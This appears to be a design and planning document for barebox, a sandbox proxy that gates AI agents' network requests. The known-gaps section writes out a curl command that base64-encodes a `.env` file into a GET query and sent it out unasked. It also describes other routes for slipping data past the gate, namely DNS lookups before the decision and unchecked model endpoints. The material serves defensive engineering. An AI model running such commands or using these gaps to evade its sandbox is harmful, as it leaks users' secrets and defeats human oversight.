- Terminal colors (user, Nov 3): `sbx run`'s question and answer lines get basic ANSI colors when stderr is a TTY and `NO_COLOR` is unset: yellow header, bold agent name, bold labels, cyan URL, dim data and hold id, green allowed, red denied or timed out. `--json` and piped output stay plain. The hold id reads `(hold h2)`. Demo A colors its own STEP, key and summary lines the same way.
- Hold wait (user, Nov 3): the default is now **wait until answered** (`holdTimeoutSec` default `"never"`, was 120). `sbx run --hold <seconds|never>` sets it per run and overrides the config key. The backlog stays bounded: one held request per agent, 16 waiting, the 17th gets 429. Held bodies stay spooled to disk. The library's `createHolds`/`createProxy` default stays 120 s for API callers.
- Recorded demo (user, Nov 3): the video is a **live muse run**, `run.sh --driver muse --live`: Meta's muse model (`meta-models/muse-spark-open-1026`, via Baseten) books the flight inside barebox and the user answers each question. Model calls are labelled `r` with an rwxmap label (`examples/demo-a/labels/baseten`), and the Baseten key is a barebox secret (the agent holds a placeholder). The 9 scripted-approver muse runs (3 per mode) are kept as evidence in `docs/logs/m7-muse-runs/`; which prompts-per-task number goes in the README is decided later. Known gap, logged for after the freeze: a model endpoint labelled `r` is an open channel; a fix idea is to allow a model call freely only when it carries the run's secret placeholder.
- Start time (measured Nov 3, load ~2, 11 runs): `sbx run -- true` median **0.70 s** (0.56-0.80), proxy start to teardown; 0.80 s with `--overlay`. Bare bwrap is 6 ms and `node -e 0` 0.16 s on the same box, so most of it is Node starting the proxy and the CLI. The README's old "10 ms" was the M0 bwrap-only figure. The recorded Demo A take (31 requests: 23 free, 8 asked) and Demo B (3 of 3 exfiltration attempts blocked in every mode) are the README's demo numbers; a prompts-per-task comparison against a stock agent stays open.
| Estimate | 1.5 days. |

### Total

About 9–10 days on Linux. This is tight for the hackathon.

## 8. Day-by-day plan (Oct 26 – Nov 5, 01:00 Amsterdam time)

This is a plan, not a result. It shifts as POCs return. Review cap per module: one self-review and one branch-review. Nits go to the fix ledger, not into more rounds.

| Day | Date | Work | Gate |
|---|---|---|---|
| 1 | Oct 26 | M0, M1, M2 POCs (done: all three go/no-go PASS) | Go/no-go (a), (b), (c) met |
| 2 | Oct 27 | Graduation rewrite, reviews, rewrite bench (done) | Branch review: ready |
| 3 | Oct 28 | M2.5 ask seam, M4 undo layer, hardening, release 0.4.0 (done) | 0.4.0 on npm |
| 4 | Oct 29 | M3 scoping, memory POC (rounds 1 and 2 done) | |
| 5–6 | Oct 30–31 | M3 build and review. bareguard 0.29.0 and rwxmap 0.8.0 land upstream. (done Oct 30: 0.5.0 released) | Proxy about 145-175 MB (superseded Nov 2: about 205-245 MB over HTTPS, see M6) at 40 agents on bareguard 0.30.0, pinned (143–172 MB measured, quiet to busy machine; re-decided Oct 30; was ≤ 80 MB) |
| 7 | Nov 1 | M5 (keys) | |
| 8 | Nov 2 | M6 numbers. Demo B. | Memory targets measured |
| 9 | Nov 3 | Demo A, README. Freeze in the evening. | |
| 10 | Nov 4 | Release 0.6.0 and submission (0.5.0 shipped M3 on Oct 30) | |
| 11 | Nov 5 | Buffer only, before 01:00 Amsterdam time | |

Days 1–3 are results; the rest is a plan. F1 (bareguard `askUnheld`) and F2 (rwxmap `match` entry) land in their own repos and gate M3's `auto`/`ask` modes; if either slips, M3 ships `trust` + floor first.

## 9. Later (after the hackathon)

Not sorted into the 10 days.

| Item | Note |
|---|---|
| macOS walls | `sandbox-exec` profile plus APFS clone (`cp -c`) for undo. No Mac available; needs a test machine (borrowed Mac or macOS CI runner) before it can start. About 1–1.5 days. |
| Windows | Via WSL2. A test run of the Linux build. |
| Body placeholder swap | For cards, for example `{{CARD}}` in a form body. |
| Per-step snapshots | Per-step undo of the upper layer. |
| Phone push approvals | |
| Landlock / seccomp hardening | |
| GraphQL / gRPC parsing | |
| Llama end-of-run summary | Plain-language summary of the diff and audit log, flags off-task changes; model output treated as untrusted. Optional, not required for the hackathon. |
| Go proxy rewrite | See the verdict below. |
| URL data check (parked Nov 3, reopen about Nov 10) | Closes the bulk case of "data in a GET" (section 10). A mark like `cardLike`: a request whose query or path is longer than N bytes, or holds an unbroken base64/hex run of M+ characters, asks in every mode (a mark only adds an ask, so no bareguard change). **Sizing first:** set N and M from real traffic before building, using the Demo A audit plus a Claude Code `sbx run` audit, and list the longest legitimate URLs (signed S3 links, OAuth redirects, page cursors). The test must show the `base64 .env` GET red today, asking after, and a Claude Code run with zero new asks. It does not stop data sent in small pieces; docs say "large data in a URL asks", not "closed". Estimate about half a day: brief, one worker, mutation, suite 3x, Demo A and B, real-agent smoke. |
| First-contact host ask plus DNS after the gate | Closes the small-pieces case: the first request to a host new in this run asks (in `ask` and `auto`; model endpoints and secret-bound hosts exempt). Needs "DNS resolves before the gate" (section 10) fixed first, or a hostname leaks before the ask. Socket code; size after the URL data check lands. |
| Model call key check | Model endpoints go free only with the run's own secret placeholder, else `x` (section 10). |
| Letter accuracy (rwxmap with rwxlite) | Replaces "letter by method" for APIs with a spec: POST reads and AWS-style `?Action=` GETs (rwxlite, Nov 3: label recipe 98.5% on GETs, 93% on POSTs; model not yet evaluated; TF-IDF baseline about 1.5 ms per call). Spec-only: no help for hosts without a spec or body-dependent RPC (GraphQL, JSON-RPC). Does not close the leaks. |

**Go verdict, verbatim:**

> Verdict: Node, with no real contest. Go wins on memory and shipping. Node wins on reuse, and that reuse turns out to be large. Go could come back later as a rewrite of just the proxy, if measurements ever show memory is the bottleneck.

## 10. Known gaps

- **Writes over sockets escape the overlay.** A local Postgres or Docker daemon is not a file. See Open questions.
- **Commit conflicts.** If the user edits the same files during a run, M4 flags the conflict. It does not merge.
- **Held requests can time out on the server side.** Holding happens before forwarding, so only the agent's client waits.
- **Card numbers in bodies over 64 KB are not checked.** Such bodies stream through with the normal letter and mode decision. Checking and denying them would break large uploads, because random 16-digit ids pass Luhn about 1 time in 10.
- **API keys or passwords inside a body still appear in the 4 KB preview** (ask file only; the audit file holds no preview). Card numbers are masked. bareguard's redaction covers common token shapes once it lands. barebox builds no scrubber of its own.
- **Payment domains are not built.** Only the four path fragments (`/checkout`, `/payment`, `/orders`, `/purchase`) ask as the payment floor; a request to a known payment domain on any other path is decided by its letter and the mode.
- **Held bodies add up on disk.** Each agent has one parked body of up to 50 MB (`heldBodyMaxMB`) in `<runtime>/held`, so 40 agents can hold 2 GB; the runtime defaults to a temp dir, which is often a RAM-backed tmpfs. There is no total cap, and the 145-175 MB budget (superseded Nov 2: about 205-245 MB over HTTPS, see M6) does not count it.
- **Certificate pinning breaks inspection.** Out of scope.
- **Data in a GET leaves free in every mode (found Nov 3, reproduced).** `r` (GET/HEAD) is free by design, but the URL carries data to any host that resolves: in `ask` mode, `curl "https://httpbin.org/anything/pixel.gif?d=$(base64 .env)"` delivered the file with 0 asks. Demo B's attacker host is `attacker.invalid`, refused only as unresolvable, so it never covered this. Nothing tried yet. Options: ask on first contact with a new host per run; treat a large or high-entropy query as `x`; a free-read host list with the rest asking in `ask`. **Decided Nov 3 (user): known limit for the hackathon release; the fix is parked, specced with sizing in section 9 (URL data check, then first-contact host ask).** The first-contact option needs the DNS fix below, or a hostname still leaks before the ask.
- **DNS resolves before the gate (found Nov 3, code-verified, not observed on the wire).** `checkUpstream` resolves the hostname on arrival (`src/proxy.js:666` for plain HTTP, `:943` at CONNECT), before the gate decides, so data encoded in a hostname reaches the attacker's name server even when the request is then held or denied, in every mode. Nothing tried yet. Fix: decide first, resolve after; for CONNECT, resolve when the first request in the tunnel is decided. **Decided Nov 3 (user): known limit for the hackathon release; the fix is planned after it.**
- **Model endpoints are an open channel.** Built-in model endpoints and a model API labelled `r` go out free in every mode with any key, an attacker's included. Ledger since Nov 2. Fix idea: free only when the call carries the run's own secret placeholder, else `x`.
- **A model API labelled `r` is still card-scanned** (found Nov 3). Only the built-in endpoints and `localLlm` skip the card floor (`modelTools`). With a card number anywhere in the conversation, every later call to a labelled model API (Baseten in Demo A) is held. README corrected.
- **A Node install dir that contains the runtime shows `asks/` and other agents' sockets inside** (ledger, reproduced Nov 1). Rare layout. Fix: refuse such a runtime, or mask it under the Node bind.
- **Better letters do not close these leaks.** A request classifier (rwxmap labels, or the rwxlite model in training) makes `r`/`w`/`x` more accurate per operation, and can mark payment APIs. It cannot fix the leaks above: a GET carrying data is still a read, a model call is still `r`, and DNS order, the `~/.claude` mask and the Node bind are not about letters. Those need policy or proxy changes. Letter accuracy is a separate track after the hackathon.
- **The proxy sees traffic, not intent.** Every API needs a mapping. File edits and local stdio MCP servers never touch the network. The undo layer and locked paths cover files. An MCP server running outside the sandbox with its own credentials is a hole.

## 11. Open questions

None of these block M0. Nothing here is silently assumed.

| # | Question | Decides |
|---|---|---|
| 1 | What is the real proxy memory with bareguard loaded? Bench without bareguard: 77.9 MB (Oct 28, 20 agents × (1 parked + 16 waiting)). M3 POC round 1 (Oct 29, one process, forced GC): baseline 78.0 MB, 90.9 MB after 360 checks and 360 matches, 112.9 MB with 360 held bodies; it included the client side. **Round 2 (Oct 29, proxy in its own process):** about 76.4 MB before bodies with `--max-semi-space-size=1` (90.5 MB with default Node), 77.3 MB with 20 held 64 KB bodies. Measured then under 80 MB, but that test had no real HTTP: superseded Oct 30. **B2c (real bench):** 99.5 / 114.4 / 124.3 / 143.6 MB at 10 / 20 / 30 / 40 agents worst case with bareguard 0.30.0; normal use 83-87 MB. Budget re-decided by the user as a range, about 145-175 MB (superseded Nov 2: about 205-245 MB over HTTPS, see M6), 40 agents per proxy maximum. The `sbx` proxy runs with the flag; see M3, "Memory". | Decided Oct 30. |
| 2 | ~~`node-forge` or shelling out to `openssl` for certificates?~~ Decided Oct 26: `openssl` subprocess (sandbox keeps proxy RSS clean; platform coupling accepted, see M1). | — |
| 3 | How should the undo layer handle large untracked dirs (`node_modules`) and build output? | M4 design. |
| 4 | Localhost sockets (Postgres, Docker daemon) are writes the overlay can't see. Decided Oct 26 for M0: block. | M3 revisits only if a demo needs a local DB. |
| 5 | Server-side timeouts while a request is held. How long can a hold last in practice? | The approval timeout value in M2. The idea note's sketch used 120 s; that is not tested. |
| 6 | ~~Working name.~~ Decided: **barebox** (npm + repo); CLI stays `sbx`. | — |
| 7 | **The agent's own model calls.** An agent POSTs to its LLM API (`/v1/messages`, `/v1/chat/completions`) every turn. With "other methods = x", `auto` would ask on every turn. Recommendation: ship a small default rwx label set marking known inference endpoints (Anthropic, OpenAI-compatible, Baseten, local) as `r` (no outside side effect beyond cost), extendable by the user. Cost limits belong to bareguard's `budget`, not to an ask. **Decided Oct 29:** labelled r by policy in barebox, not rwxmap; default list in M3 "Model endpoints". **Decided Nov 2 (user):** model calls also skip the card floor; a card in the conversation held a Claude Code call and killed the agent (Demo B), while its larger calls passed unscanned, so the floor fired by body size. Every other request keeps the floor. | Decided. |
| 8 | **"Don't ask again for this run"** (Claude Code's option). Should an answer carry `remember: true`, scoped to agent + method + host for the rest of the run? It cuts repeat asks, but bareguard's `gate.add` only tightens, so widening needs support there (would be friction F5). Recommendation: leave it out of M2.5; decide in M3 after seeing how noisy `auto` is with Q7 in place. **Decided Oct 29:** not in v1. | Decided. |
| 9 | **Ask timeout with a file channel.** Polling adds latency; the M2 default deadline was 120 s. What poll interval and default deadline? Recommendation: 250 ms poll, 120 s deadline, configurable; timeout = deny. | M2.5. |
| 10 | **The hold decision never sees the body** (found Oct 27, design read). `shouldHold(req)` runs in `handleRequest` *before* the body is read and gets method, URL and headers only. Unheld requests stream straight to upstream; only held ones are buffered. So the body half of the card/payment floor — card numbers (Luhn) ask in every mode, `trust` included (section 2) — is **not enforced today**, and no body-based rule (bareguard `secrets` in a body, payment JSON) can be. Fixing it changes the proxy's core path: either buffer every request body up to a cap before deciding (latency + memory on every request; what cap, and what happens above it — deny, ask, or stream unchecked?), or decide in two passes (headers now, body at end-of-stream before the last byte goes upstream — needs holding the final chunk). Recommendation: buffer up to a small cap (e.g. 64 KB, card numbers and secrets live in small bodies), stream larger bodies with the floor applied to their first cap bytes, and measure the cost against the 80 MB target with 20 agents. **Decided Oct 29:** replaced later the same day by the final design: 64 KB read-whole threshold with a card scan and a floor ask (never a deny); larger bodies stream unchecked (known gap); held bodies go to a file (cap 50 MB); one 64 KB working slot per agent. See M3, "The body check". | Decided. |
